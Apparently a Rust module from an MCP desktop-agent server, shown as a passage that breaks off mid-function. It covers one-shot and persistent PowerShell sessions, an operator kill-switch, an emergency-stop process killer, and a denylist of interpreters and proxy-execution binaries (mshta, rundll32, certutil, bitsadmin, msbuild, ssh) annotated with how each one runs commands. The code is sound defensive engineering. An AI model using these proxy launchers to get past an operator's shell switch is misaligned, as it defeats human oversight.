//! Shell control: one-shot commands and persistent PowerShell sessions.
//!
//! Two modes exist behind the single `ghost_shell` MCP verb:
//!   * one-shot `run` - spawn a shell, run one command, capture merged output.
//!   * persistent sessions (`open`/`send`/`read`/`kill`) - a long-lived PowerShell
//!     process whose variables, cwd and env persist across commands.
//!
//! Persistent framing: the driver reads `<nonce> <base64(utf8 cmd)>` lines from
//! stdin, dot-sources the decoded command with its error stream merged, then emits
//! a sentinel line `__GHOST_DONE_<nonce>__ <exitcode>` (the native exit code, or
//! 1 when the command threw or wrote a PowerShell error record), where `<nonce>` is an
//! unguessable per-session secret plus a counter, so command output cannot
//! forge a completion. base64 makes any command
//! text injection-safe; the per-session nonce means a late sentinel from a
//! timed-out command can never be mistaken for a later command's sentinel.
//!
//! Kill-switch: `GHOST_SHELL=off` (or `false`/`0`/`no`) makes every op
//! return an error. The MCP bundle exposes it as a checkbox.

use std::collections::HashMap;
use std::process::Stdio;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, ChildStdout, Command};

use crate::error::{GhostError, Result};
use crate::session::GhostSession;

/// Programs that ARE a command interpreter, script host or shell. Refused as
/// the program, and also when named as an argument (a proxy launcher we do not
/// know about, `foo.exe cmd /c x`, still hands the agent one of these).
const INTERPRETERS: &[&str] = &[
    "cmd", "command",                         // Windows command processors
    "powershell", "powershell_ise", "pwsh",   // PowerShell 5 / ISE / 7
    "wscript", "cscript", "mshta",            // Windows Script Host, HTML Applications
    "wsl", "bash", "sh", "zsh", "fish", "dash", "ksh", "mksh", "tcsh", "csh", // POSIX shells (wsl runs one)
    "busybox",                                // `busybox sh`, and every applet it carries
    "py", "perl", "ruby", "php", "node", "deno", "bun", "lua", "tclsh", "wish", // script interpreters
];

/// Programs that open a terminal (which starts a shell) or start another
/// program named in their arguments. Refused as the program only: the name
/// alone is the risk, and as an argument they would be too common a word.
const LAUNCHERS: &[&str] = &[
    // Terminals: each starts an interactive shell.
    "conhost", "wt", "windowsterminal",
    "gnome-terminal", "konsole", "xterm", "uxterm", "x-terminal-emulator", "xfce4-terminal", "mate-terminal",
    "lxterminal", "qterminal", "terminator", "tilix", "kitty", "alacritty", "wezterm", "foot", "urxvt", "rxvt",
    // Windows proxy execution: each runs a command line or program it is given.
    "rundll32", "regsvr32",   // run a DLL export / COM registration script
    "wslg",                   // runs a Linux command
    "wmic",                   // `process call create "<cmdline>"`
    "explorer",               // opens any path through the shell, programs included
    "pcalua",                 // Program Compatibility Assistant: `-a <program>`
    "forfiles",               // `/c "<command>"` per file
    "schtasks", "at",         // schedule an arbitrary command
    "sc",                     // creates a service with an arbitrary binary path
    "msiexec",                // installer packages run custom actions (also from URLs)
    "mmc",                    // snap-ins / .msc files can run commands
    "hh",                     // compiled HTML help runs script and shortcuts
    "msbuild",                // project files carry inline tasks (C#)
    "installutil", "regasm", "regsvcs", // run code in a .NET assembly
    "cmstp",                  // connection-manager profiles run commands
    "certutil", "bitsadmin",  // download (and bitsadmin can run) a program
    "runas",                  // starts a program named in its arguments
    "ssh",                    // a remote (or localhost) shell
    "control",                // runs Control Panel items (DLLs)
    "msdt",                   // troubleshooter packages run script
    "odbcconf",               // `REGSVR` action loads a DLL
    "scriptrunner",           // `-appvscript <program>`
    // Linux launchers: each starts the program or file it is given.
    "gtk-launch", "xdg-open", "gio", "kde-open", "kde-open5", "exo-open", // .desktop files, scripts by association
    "env", "nohup", "setsid", "nice", "timeout", "stdbuf", "xargs", "flock", "chroot", "unshare", // exec their arguments
    "sudo", "pkexec", "doas", "su", "systemd-run", // run a command (as another user)
    "script", "expect", "watch",                    // run a shell / a command
    // Run shell commands from their own options: an editor's `-c "!cmd"`,
    // git's `-c alias.x=!cmd` / core.pager / core.sshCommand, a pager's `!cmd`,
    // a debugger's `shell`, a database shell's `\!` / `.shell`, awk's system(),
    // tar's --to-command, zip's -TT, a terminal multiplexer.
    "vi", "vim", "nvim", "gvim", "view", "rvim", "vimdiff", "gview", "ex", "ed", "emacs", "nano", "pico",
    "git", "less", "more", "man", "gdb", "lldb", "cdb", "windbg", "tmux", "screen",
    "psql", "sqlite3", "mysql", "awk", "gawk", "mawk", "nawk", "tar", "zip",
];

/// Extensions that are not a program but run as one through an interpreter
/// or the shell's file association.
const SCRIPT_EXTS: &[&str] = &[
    "bat", "cmd", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "hta", "msc", "lnk", "url", "scr", "pif",
    "cpl", "msi", "inf", "desktop", "sh",
];

/// Extensions a program file may carry, stripped before the name is compared.
const PROGRAM_EXTS: &[&str] = &["exe", "com"];

/// Split a command line into its program (unquoted) and the rest.
fn split_program(line: &str) -> (&str, &str) {
    match line.strip_prefix('"') {
        Some(rest) => match rest.find('"') {
            Some(i) => (&rest[..i], rest[i + 1..].trim()),
            None => (rest, ""),
        },
        None => match line.find(char::is_whitespace) {
            Some(i) => (&line[..i], line[i..].trim()),
            None => (line, ""),
        },
    }
}

/// (lowercase basename, stem, extension) of a path, on either separator.
/// Windows ignores trailing dots and spaces; Debian's `.wrapper`/`.real`
/// suffixes (x-terminal-emulator -> gnome-terminal.wrapper) are dropped.
fn name_parts(path: &str) -> (String, String, String) {
    let base = path
        .trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .trim_end_matches(['.', ' '])
        .to_ascii_lowercase();
    let base = base.strip_suffix(".wrapper").or_else(|| base.strip_suffix(".real")).unwrap_or(&base).to_string();
    match base.rsplit_once('.') {
        Some((s, e)) if PROGRAM_EXTS.contains(&e) || SCRIPT_EXTS.contains(&e) => (base.clone(), s.to_string(), e.to_string()),
        _ => (base.clone(), base, String::new()),
    }
}

/// python, python3, python3.11, pythonw
fn is_python(stem: &str) -> bool {
    stem.strip_prefix("python")
        .is_some_and(|r| r.trim_start_matches('w').chars().all(|c| c.is_ascii_digit() || c == '.'))
}

/// Whether an argument is a PowerShell `-Command` / `-EncodedCommand` /
/// `-CommandWithArgs` (or, `strict`, `-File`) switch in any spelling the
/// PowerShell parser accepts: any unambiguous prefix, led by `-`, `--`, `/`
/// or a Unicode dash, optionally `:value`.
fn is_ps_script_switch(tok: &str, strict: bool) -> bool {
    let t = tok.to_lowercase();
    let mut chars = t.chars();
    let Some(first) = chars.next() else { return false };
    if !matches!(first, '-' | '/' | '\u{2013}' | '\u{2014}' | '\u{2015}') {
        return false;
    }
    let mut rest = chars.as_str();
    if first != '/' {
        rest = rest.strip_prefix(['-', '\u{2013}', '\u{2014}', '\u{2015}']).unwrap_or(rest);
    }
    let name = rest.split(':').next().unwrap_or("");
    if name.is_empty() {
        return false;
    }
    let prefix_of = |full: &str, min: usize| name.len() >= min && full.starts_with(name);
    prefix_of("command", 1)
        || prefix_of("commandwithargs", 1)
        || name == "cwa"
        || prefix_of("encodedcommand", 1)
        || name == "ec"
        || (strict && prefix_of("file", 2))
}

/// Whether an argument is a `cmd` run switch: `/c`, `/k`, `/r` in any case,
/// or (`strict`) glued to its command (`/ccalc`).
fn is_cmd_switch(tok: &str, strict: bool) -> bool {
    let t = tok.to_ascii_lowercase();
    let Some(rest) = t.strip_prefix('/') else { return false };
    let mut c = rest.chars();
    match c.next() {
        Some('c' | 'k' | 'r') => c.as_str().is_empty() || strict,
        _ => false,
    }
}

/// Whether the text names an 8.3 short name (`POWERS~1.EXE`, `WINDOW~1`).
fn has_short_name(path: &str) -> bool {
    path.split(['\\', '/']).any(|part| {
        part.find('~').is_some_and(|i| part[i + 1..].starts_with(|c: char| c.is_ascii_digit()))
    })
}

/// `GHOST_LAUNCH_ALLOW`: comma-separated basenames (`notepad`) or full paths
/// (`C:\Tools\viewer.exe`). None when unset or blank.
pub fn parse_launch_allow(value: Option<&str>) -> Option<Vec<String>> {
    let list: Vec<String> = value?
        .split(',')
        .map(|e| e.trim().trim_matches('"').trim().to_lowercase())
        .filter(|e| !e.is_empty())
        .collect();
    (!list.is_empty()).then_some(list)
}

/// Whether `program` (as typed, and as resolved when it resolved) is on the
/// allowlist. A path entry must equal the program's full path; a basename
/// entry matches the program's name with or without `.exe`.
fn allowlisted(allow: &[String], program: &str, resolved: Option<&str>) -> bool {
    let norm = |p: &str| p.trim_matches('"').replace('/', "\\").to_lowercase();
    let full = norm(resolved.unwrap_or(program));
    let (_, stem, ext) = name_parts(resolved.unwrap_or(program));
    allow.iter().any(|entry| {
        if entry.contains(['\\', '/']) {
            norm(entry) == full
        } else {
            let (_, e_stem, _) = name_parts(entry);
            e_stem == stem && (ext.is_empty() || PROGRAM_EXTS.contains(&ext.as_str()))
        }
    })
}

/// With `GHOST_SHELL=off`, the launch verbs refuse a command line that would
/// hand the agent a shell anyway. Pure: no process is touched.
///
/// The program is judged by the name as typed AND by the name `resolve`
/// returns for it (the long path on Windows, so an 8.3 alias such as
/// `POWERS~1.EXE` cannot hide `powershell`; the symlink target on Linux). A
/// program that does not resolve is judged by its typed name, under stricter
/// argument rules (glued `cmd` switches, `-File`), and refused outright when
/// it is written with an 8.3 alias.
///
/// This is a denylist and cannot be complete. `allow` (`GHOST_LAUNCH_ALLOW`)
/// is the strict option: when given, only the listed programs launch.
pub fn launch_allowed_with_shell_off(
    cmdline: &str,
    allow: Option<&[String]>,
    resolve: &dyn Fn(&str) -> Option<String>,
) -> std::result::Result<(), String> {
    let refuse = |why: &str| {
        Err(format!(
            "GHOST_SHELL=off refuses this launch: {why}. Launching a command interpreter, terminal, script host or a program that starts other programs would run commands the operator turned off. Plain applications still launch (for example 'notepad' or 'notepad C:\\x.txt'); the operator can list exactly which programs may launch with GHOST_LAUNCH_ALLOW."
        ))
    };
    let line = cmdline.trim();
    if line.is_empty() {
        return refuse("the command line is empty");
    }
    let (program, args) = split_program(line);
    let resolved = resolve(program);

    if let Some(allow) = allow {
        if !allowlisted(allow, program, resolved.as_deref()) {
            let shown = resolved.as_deref().unwrap_or(program);
            return Err(format!(
                "GHOST_SHELL=off with GHOST_LAUNCH_ALLOW set launches only the listed programs; '{shown}' is not one of them."
            ));
        }
    } else {
        for name in std::iter::once(program).chain(resolved.as_deref()) {
            let (base, stem, ext) = name_parts(name);
            if SCRIPT_EXTS.contains(&ext.as_str()) {
                return refuse(&format!("'{base}' is a script or shortcut file"));
            }
            if is_python(&stem) || INTERPRETERS.contains(&stem.as_str()) {
                return refuse(&format!("'{stem}' is a command interpreter or script host"));
            }
            if LAUNCHERS.contains(&stem.as_str()) {
                return refuse(&format!("'{stem}' is a terminal or starts other programs"));
            }
        }
        if resolved.is_none() && has_short_name(program) {
            return refuse(&format!("'{program}' is an 8.3 short name that could not be resolved to its real name"));
        }
    }

    // Only reached by an allowlisted program when it is itself one of these.
    let interpreter = std::iter::once(program).chain(resolved.as_deref()).any(|name| {
        let (_, stem, ext) = name_parts(name);
        SCRIPT_EXTS.contains(&ext.as_str())
            || is_python(&stem)
            || INTERPRETERS.contains(&stem.as_str())
            || LAUNCHERS.contains(&stem.as_str())
    });
    // The operator vouched for this program: its arguments are its own.
    if allow.is_some() && !interpreter {
        return Ok(());
    }
    // A program that resolved to a plain application gives `-c`, `/k`, `-C`
    // its own meaning (ffmpeg, gcc, git); the switch scan is for interpreters
    // and programs Ghost cannot see.
    let scan_switches = resolved.is_none() || interpreter;
    let strict = resolved.is_none();
    for tok in args.split_whitespace() {
        let t = tok.trim_matches(['"', '\'']);
        if scan_switches && (is_ps_script_switch(t, strict) || is_cmd_switch(t, strict)) {
            return refuse(&format!("the argument '{tok}' looks like inline script"));
        }
        if !t.contains("://") {
            let (_, stem, _) = name_parts(t);
            if is_python(&stem) || INTERPRETERS.contains(&stem.as_str()) {
                return refuse(&format!("the argument '{tok}' names a command interpreter"));
            }
        }
    }
    Ok(())
}

/// The program a command line names, resolved the way the launch verbs will
/// find it: on Windows a bare name through `SearchPathW` (the CreateProcess
/// search order, `.exe` appended), then every component expanded to its long
/// name with `GetLongPathNameW`. None when it cannot be found.
#[cfg(windows)]
pub fn resolve_program(program: &str) -> Option<String> {
    use windows::core::{HSTRING, PCWSTR};
    use windows::Win32::Storage::FileSystem::{GetLongPathNameW, SearchPathW};
    let p = program.trim().trim_matches('"');
    if p.is_empty() {
        return None;
    }
    let mut buf = vec![0u16; 1024];
    let found = if p.contains(['\\', '/']) {
        p.to_string()
    } else {
        let n = unsafe { SearchPathW(PCWSTR::null(), &HSTRING::from(p), &HSTRING::from(".exe"), Some(&mut buf), None) } as usize;
        if n == 0 || n >= buf.len() {
            return None;
        }
        String::from_utf16_lossy(&buf[..n])
    };
    let n = unsafe { GetLongPathNameW(&HSTRING::from(found.as_str()), Some(&mut buf)) } as usize;
    (n > 0 && n < buf.len()).then(|| String::from_utf16_lossy(&buf[..n]))
}

/// Elsewhere: a bare name through `PATH`, then every symlink followed
/// (`/usr/bin/x-terminal-emulator` -> `gnome-terminal.wrapper`).
#[cfg(not(windows))]
pub fn resolve_program(program: &str) -> Option<String> {
    let p = program.trim().trim_matches('"');
    if p.is_empty() {
        return None;
    }
    let path = if p.contains('/') {
        std::path::PathBuf::from(p)
    } else {
        std::env::split_paths(&std::env::var_os("PATH")?).map(|d| d.join(p)).find(|c| c.is_file())?
    };
    std::fs::canonicalize(path).ok().map(|c| c.to_string_lossy().into_owned())
}

/// Gate for every launch verb: when `GHOST_SHELL` is off, refuse command lines
/// that would start a shell by another route, and when `GHOST_LAUNCH_ALLOW`
/// is set, anything it does not list.
pub(crate) fn ensure_launch_allowed(cmdline: &str) -> Result<()> {
    if shell_disabled() {
        let allow = parse_launch_allow(std::env::var("GHOST_LAUNCH_ALLOW").ok().as_deref());
        launch_allowed_with_shell_off(cmdline, allow.as_deref(), &resolve_program).map_err(GhostError::Config)?;
    }
    Ok(())
}

/// Per-response output cap (chars). Protects the agent context window.
const MAX_OUTPUT_CHARS: usize = 24_000;
/// Default per-command timeout.
const DEFAULT_TIMEOUT_MS: u64 = 30_000;
/// Hard ceiling on any timeout the caller can request.
const MAX_TIMEOUT_MS: u64 = 600_000;
/// How often the read loop wakes to check the stop flag / deadline.
const POLL_MS: u64 = 200;
/// How long `op=read` waits for the pending command when the caller names no
/// `timeout_ms`. Zero made a bare `read` return before it had read anything.
const DEFAULT_READ_WAIT_MS: u64 = 2_000;
/// Past the deadline, a read still collects output the shell already wrote
/// for up to this long: a pipe read needs a moment to complete even when the
/// bytes are waiting, so a zero-wait read must not give up before trying.
const DRAIN_GRACE_MS: u64 = 100;

/// One persistent PowerShell process.
struct ShellSession {
    child: Child,
    stdin: ChildStdin,
    reader: BufReader<ChildStdout>,
    /// Monotonic per-session command counter.
    nonce: u64,
    /// Random per-session value mixed into every sentinel, so the completion
    /// marker cannot be predicted -- and therefore cannot be forged -- by
    /// anything the command prints. Without it the marker is
    /// `__GHOST_DONE_1__ 0`, which a command that echoes attacker-controlled
    /// text (a log line, a downloaded file, `cat` of an untrusted path) can
    /// emit itself: Ghost would then report someone else's exit code, treat the
    /// real output as belonging to the next command, and desynchronise the
    /// session for good.
    secret: String,
    /// Set when a `send` timed out and its command is still running. Holds the
    /// nonce whose sentinel `read` must still drain before the session is usable.
    pending: Option<u64>,
    /// Bytes of a line not yet ended by a newline. Kept across reads so a read
    /// that times out mid-line loses nothing (`read_until` is cancel-safe only
    /// with a buffer that outlives the call).
    partial: Vec<u8>,
    /// Raised by `op=kill`, so a read waiting on this shell gives it up.
    killed: Arc<AtomicBool>,
    created: Instant,
    pid: Option<u32>,
    /// What `end_shell` ends with the shell (see [`Group`]).
    group: Option<Group>,
    /// The stop generation when this shell started: if a stop ended shells
    /// since, this one was among them (see `ended_by_stop`).
    born_gen: u64,
}

/// One named persistent session. It stays in the registry for its whole life,
/// including while a call runs a command in it (that call holds `shell`), so
/// `list` can show it busy and `kill` can end it.
#[derive(Clone)]
struct SessionSlot {
    pid: Option<u32>,
    /// The shell's [`Group`], so `kill` can end it without waiting for a
    /// call that holds `shell`.
    group: Option<Group>,
    created: Instant,
    killed: Arc<AtomicBool>,
    shell: Arc<tokio::sync::Mutex<ShellSession>>,
}

/// Registry of persistent sessions, held in a Mutex on GhostSession.
#[derive(Default)]
pub struct ShellRegistry {
    sessions: HashMap<String, SessionSlot>,
    auto_id: u64,
    /// A pre-spawned PowerShell running the persistent driver, waiting for
    /// exactly one `op=run` command. Measured: a fresh `powershell -Command`
    /// costs 232-447 ms of process start and module prep on this machine, and
    /// `op=run` is 60% of all Ghost calls. Handing the command to a process
    /// that already finished starting brings that to single-digit ms. The spare
    /// is replaced right after it is taken, so the next call is warm too.
    warm: Option<ShellSession>,
}

impl ShellRegistry {
    pub fn new() -> Self {
        Self::default()
    }
}

fn shell_disabled() -> bool {
    shell_off_value(std::env::var("GHOST_SHELL").ok().as_deref())
}

/// Whether `ghost_shell` will run anything. Reported at start-up, so an
/// operator can see from the host's log whether this server can run programs.
pub fn shell_enabled() -> bool {
    !shell_disabled()
}

/// How `GHOST_SHELL` reads. `off` is the documented spelling; `false`, `0` and
/// `no` are accepted too, because the MCP bundle exposes this as a checkbox and
/// a checkbox writes `false`, not `off`. Unset, empty, or anything unrecognised
/// leaves the shell ON - the capability is the point of the tool, so only a
/// clear refusal turns it off.
fn shell_off_value(value: Option<&str>) -> bool {
    matches!(
        value.map(|v| v.trim().to_ascii_lowercase()).as_deref(),
        Some("off" | "false" | "0" | "no" | "disabled")
    )
}

/// `GHOST_SHELL_WARM=off` disables the pre-spawned spare (one idle PowerShell
/// per ghost process, roughly 40 MB).
fn warm_disabled() -> bool {
    matches!(std::env::var("GHOST_SHELL_WARM"), Ok(v) if v.trim().eq_ignore_ascii_case("off"))
}

/// Prefix that moves a driver-run command into `cwd`. Single quotes are the
/// PowerShell literal string delimiter and are escaped by doubling.
fn cwd_prefix(cwd: &str) -> String {
    format!("Set-Location -LiteralPath '{}'; ", cwd.replace('\'', "''"))
}

/// Give a shell process a console that is never shown.
///
/// The MCP server has no console of its own (its host starts it on pipes), so
/// a shell spawned plainly has none either - and every console PROGRAM that
/// shell then runs (node, python, cargo, cmd) gets a brand-new visible console
/// from Windows, which on Windows 11 is a Windows Terminal window that takes
/// the human's foreground for as long as the program runs. Measured
/// 2026-09-05: a `node` child popped a window titled with its own path and
/// held the foreground. `CREATE_NO_WINDOW` gives the shell an invisible
/// console instead; its children inherit that one and never create a window.
/// Output is piped regardless, so nothing is lost.
fn no_console_window(command: &mut Command) {
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        command.creation_flags(CREATE_NO_WINDOW);
    }
    #[cfg(not(windows))]
    {
        let _ = command;
    }
}

/// Everything a shell starts ends with the emergency stop - not just the
/// shell process: a command's own children (a script driving the desktop, a
/// build) used to keep running after the stop killed the shell above them.
/// Covers one-shot commands, persistent sessions (including a command left
/// running by `op=send`) and the warm spare, whichever Ghost process raised the
/// stop.
///
/// Windows: each Ghost process puts its shells in one named job and lists the
/// name in a per-user directory. A shared stop (`ghost_stop`, Ctrl+Alt+G, any
/// other Ghost) ends every listed job that still has processes - including the
/// jobs of a server that has since exited or restarted, whose programs would
/// otherwise outlive every later stop. A `scope: "process"` stop ends only this
/// server's job. The job is not kill-on-close: a program a command opened (an
/// editor, a terminal) is the human's from then on and must survive this
/// server exiting; only a stop ends it. Apps meant to outlive a stop are
/// started with `ghost_window op=launch`, which is not in any shell job.
///
/// Linux: each shell starts in its own process group, and the stop kills each
/// group this process started.
mod stop_kill {
    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::Duration;

    /// Bumped each time a stop ends shells. A shell that dies while this
    /// differs from its birth value was ended by a stop; one that exits on its
    /// own (even with exit code 57005) was not.
    static STOP_GEN: AtomicU64 = AtomicU64::new(0);

    pub(crate) fn generation() -> u64 {
        STOP_GEN.load(Ordering::Acquire)
    }

    /// When the watcher ends shells: the stop rose, or a human stop rose on
    /// top of an agent's stop that was already up (it reaches further).
    pub(crate) fn stop_edge(now: bool, was: bool, human: bool, was_human: bool) -> bool {
        (now && !was) || (human && !was_human)
    }

    /// End this server's own shells now, as the watcher would on its next
    /// tick. The generation moves first so a shell ended here reads as ended
    /// by the stop.
    pub(super) fn end_own_now() {
        STOP_GEN.fetch_add(1, Ordering::AcqRel);
        super::platform::end_own();
    }

    /// Start the watcher once: on each rise of the stop, end shells.
    pub(super) fn ensure_watcher() {
        static STARTED: std::sync::Once = std::sync::Once::new();
        STARTED.call_once(|| {
            let _ = std::thread::Builder::new().name("ghost-shell-stop".into()).spawn(|| {
                let (mut was, mut was_human) = (false, false);
                let mut tick = 0u32;
                loop {
                    let now = crate::error::is_stopped();
                    // A human stop raised on top of an agent's stop is a new
                    // edge too: it reaches further (dead servers' programs).
                    let human = now && crate::error::human_stop_active();
                    if stop_edge(now, was, human, was_human) {
                        STOP_GEN.fetch_add(1, Ordering::AcqRel);
                        super::platform::end_on_stop();
                    }
                    was = now;
                    was_human = human;
                    tick = tick.wrapping_add(1);
                    #[cfg(windows)]
                    if tick.is_multiple_of(20) {
                        super::platform::snapshot();
                    }
                    std::thread::sleep(Duration::from_millis(50));
                }
            });
        });
    }
}

#[cfg(windows)]
mod platform {
    use ghost_browser::launch::job::Job;
    use std::path::{Path, PathBuf};
    use std::sync::OnceLock;

    /// This process's job, and its name (`ghost-shell-job-<pid>-<ms>`).
    static JOB: OnceLock<Option<(Job, String)>> = OnceLock::new();

    const PREFIX: &str = "ghost-shell-job-";

    /// Where shell jobs are listed: one file per Ghost process, named after
    /// its job and holding a snapshot of the job's members (`pid creation-time`
    /// per line). A named job leaves the namespace when its creator's last
    /// handle closes - processes in it hold references, not handles - so once
    /// that server has exited its job can no longer be opened by name: the
    /// snapshot is how a later stop still finds what it started.
    pub(super) fn jobs_dir() -> PathBuf {
        #[cfg(test)]
        if let Some(d) = std::env::var_os("GHOST_TEST_SHELL_JOBS_DIR") {
            return PathBuf::from(d);
        }
        std::env::var_os("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(std::env::temp_dir)
            .join("Ghost")
            .join("shell-jobs")
    }

    fn job() -> Option<&'static Job> {
        JOB.get_or_init(|| {
            let ms = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            let name = format!("{PREFIX}{}-{ms}", std::process::id());
            match Job::new_terminable_named(&name) {
                Ok(j) => {
                    let dir = jobs_dir();
                    if let Err(e) = std::fs::create_dir_all(&dir).and_then(|_| std::fs::write(dir.join(&name), b"")) {
                        tracing::warn!("could not list the shell job ({e}); a stop after a restart will not reach it");
                    }
                    super::stop_kill::ensure_watcher();
                    Some((j, name))
                }
                Err(e) => {
                    tracing::warn!("shell job unavailable ({e}); a stop ends shells but not their children");
                    None
                }
            }
        })
        .as_ref()
        .map(|(j, _)| j)
    }

    /// Put a just-started shell in the job; its children join it as they start.
    pub(super) fn confine(pid: Option<u32>) -> Result<(), String> {
        let pid = pid.ok_or("the shell has no process id")?;
        let job = job().ok_or("the stop job could not be created")?;
        job.adopt(pid).map_err(|e| format!("could not put the shell in the stop job: {e}"))
    }

    /// The processes in this server's stop job.
    #[cfg(test)]
    pub(super) fn job_members() -> Vec<u32> {
        job().map(|j| j.process_ids()).unwrap_or_default()
    }

    /// Creation time of a process (FILETIME ticks), to tell it from a later
    /// process that reused its id.
    pub(super) fn creation_time(pid: u32) -> Option<u64> {
        use windows::Win32::Foundation::{CloseHandle, FILETIME};
        use windows::Win32::System::Threading::{GetProcessTimes, OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
        unsafe {
            let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid).ok()?;
            let (mut c, mut e, mut k, mut u) = (FILETIME::default(), FILETIME::default(), FILETIME::default(), FILETIME::default());
            let ok = GetProcessTimes(h, &mut c, &mut e, &mut k, &mut u).is_ok();
            let _ = CloseHandle(h);
            ok.then_some(((c.dwHighDateTime as u64) << 32) | c.dwLowDateTime as u64)
        }
    }

    /// Write this job's members to its file, when they changed since the
    /// last write. Called by the stop watcher about once a second.
    pub(super) fn snapshot() {
        static LAST: std::sync::Mutex<Vec<u32>> = std::sync::Mutex::new(Vec::new());
        let Some((job, name)) = JOB.get().and_then(|j| j.as_ref()) else { return };
        let mut ids = job.process_ids();
        ids.sort_unstable();
        let mut last = LAST.lock().unwrap();
        if *last == ids {
            return;
        }
        let mut text = snapshot_header(now_ms(), boot_ms());
        text.extend(ids.iter().filter_map(|&pid| creation_time(pid).map(|t| format!("{pid} {t}\n"))));
        if std::fs::write(jobs_dir().join(name), text).is_ok() {
            *last = ids;
        }
    }

    /// A snapshot is trusted for 24 hours and within one boot. Past that, a
    /// program a shell once started has long been the human's (and the file
    /// is stale either way), so a stop leaves it alone and the file is dropped.
    const SNAPSHOT_TTL_MS: u64 = 24 * 60 * 60 * 1000;

    pub(super) fn now_ms() -> u64 {
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    }

    /// When this machine booted (wall clock ms), from the uptime.
    pub(super) fn boot_ms() -> u64 {
        now_ms().saturating_sub(unsafe { windows::Win32::System::SystemInformation::GetTickCount64() })
    }

    pub(super) fn snapshot_header(written_ms: u64, boot_ms: u64) -> String {
        format!("ghost-shell-snapshot v1 written={written_ms} boot={boot_ms}\n")
    }

    /// Whether a snapshot written at `written_ms` in the boot that started at
    /// `boot_ms` may still be acted on now. Boot times are compared with a
    /// minute's slack (they are derived from the clock and the uptime).
    pub(super) fn snapshot_fresh(written_ms: u64, file_boot_ms: u64, now: u64, boot_now: u64) -> bool {
        now.saturating_sub(written_ms) <= SNAPSHOT_TTL_MS && file_boot_ms.abs_diff(boot_now) <= 60_000
    }

    /// Whether a process is in any job object. A program a Ghost shell
    /// started is (in that shell's job); an app the human opened from the
    /// desktop is normally not - so a forged or stale line naming one of
    /// those is not acted on.
    fn in_a_job(pid: u32) -> bool {
        use windows::Win32::Foundation::CloseHandle;
        use windows::core::BOOL;
        use windows::Win32::System::JobObjects::IsProcessInJob;
        use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION};
        unsafe {
            let Ok(h) = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid) else { return false };
            let mut inside = BOOL(0);
            let ok = IsProcessInJob(h, None, &mut inside).is_ok();
            let _ = CloseHandle(h);
            ok && inside.as_bool()
        }
    }

    /// End the processes a dead server's snapshot lists, each only if the
    /// snapshot is fresh (under 24 h, this boot) and the process is still the
    /// same one (same id AND creation time) and still inside a job. True if
    /// any listed process was ended; false drops the file.
    fn end_snapshot(file: &Path, code: u32) -> bool {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
        let Ok(text) = std::fs::read_to_string(file) else { return false };
        let mut lines = text.lines();
        let header = lines.next().unwrap_or("");
        let field = |k: &str| {
            header
                .split_whitespace()
                .find_map(|f| f.strip_prefix(k))
                .and_then(|v| v.parse::<u64>().ok())
        };
        let (Some(written), Some(boot)) = (field("written="), field("boot=")) else { return false };
        if !header.starts_with("ghost-shell-snapshot v1 ") || !snapshot_fresh(written, boot, now_ms(), boot_ms()) {
            return false;
        }
        let mut any = false;
        for line in lines {
            let mut it = line.split_whitespace();
            let (Some(Ok(pid)), Some(Ok(born))) = (it.next().map(str::parse::<u32>), it.next().map(str::parse::<u64>)) else {
                continue;
            };
            if creation_time(pid) != Some(born) {
                continue; // exited, or the id now belongs to someone else
            }
            if !in_a_job(pid) {
                continue;
            }
            any = true;
            unsafe {
                if let Ok(h) = OpenProcess(PROCESS_TERMINATE, false, pid) {
                    let _ = TerminateProcess(h, code);
                    let _ = CloseHandle(h);
                }
            }
        }
        any
    }

    pub(super) fn end_on_stop() {
        let code = crate::engine::process::manager::KILLED_EXIT_CODE;
        // Programs a now-dead server's shells started (from its snapshot) only
        // for the HUMAN's stop: an agent's ghost_stop must not end, say, an
        // editor another session opened this morning.
        if crate::engine::input::hotkey::human_stop_active() {
            end_all_listed(&jobs_dir(), code);
        } else if crate::engine::input::hotkey::shared_stop_raised() {
            end_live_listed(&jobs_dir(), code);
        }
        // This server's own job, in every case (a `scope: "process"` stop
        // reaches only this one).
        end_own();
    }

    /// End this server's own job: every shell it started and their programs.
    pub(super) fn end_own() {
        if let Some((job, _)) = JOB.get().and_then(|j| j.as_ref()) {
            let _ = job.terminate(crate::engine::process::manager::KILLED_EXIT_CODE);
        }
    }

    /// Resume every thread of a process started suspended.
    pub(super) fn resume(pid: u32) -> Result<(), String> {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
        };
        use windows::Win32::System::Threading::{OpenThread, ResumeThread, THREAD_SUSPEND_RESUME};
        let mut resumed = 0;
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0).map_err(|e| e.to_string())?;
            let mut t = THREADENTRY32 { dwSize: std::mem::size_of::<THREADENTRY32>() as u32, ..Default::default() };
            if Thread32First(snap, &mut t).is_ok() {
                loop {
                    if t.th32OwnerProcessID == pid {
                        if let Ok(h) = OpenThread(THREAD_SUSPEND_RESUME, false, t.th32ThreadID) {
                            if ResumeThread(h) != u32::MAX {
                                resumed += 1;
                            }
                            let _ = CloseHandle(h);
                        }
                    }
                    if Thread32Next(snap, &mut t).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snap);
        }
        if resumed == 0 {
